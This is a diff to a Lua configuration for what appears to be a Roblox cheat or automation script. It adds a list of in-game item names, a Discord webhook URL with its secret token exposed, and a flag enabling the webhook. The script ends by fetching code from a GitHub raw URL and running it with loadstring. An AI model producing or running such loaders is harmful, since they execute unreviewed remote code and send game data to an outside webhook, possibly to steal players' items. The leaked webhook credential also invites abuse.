@@ -15,6 +15,9 @@ spawn(function()
         _G.RemoveEffect = true
         _G.InviteParty = false
         _G.AcceptParty = true
+        _G.ItemsHook = {"Turbo Cat","Office Chair","Frog","Washing Powder","Softener","Cursed Egg"}
+        _G.URL = "https://discord.com/api/webhooks/1282396686932770826/PyV7szp_WRD5CCkFIPYvjFNJDtYlmQDmGV7TyVPzjeq6zBmE7amtzmMcVqNuaQlpKV0m"
+        _G.Webhook = true
     end
 end)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/DevSoGod/All/main/RF-D'))()
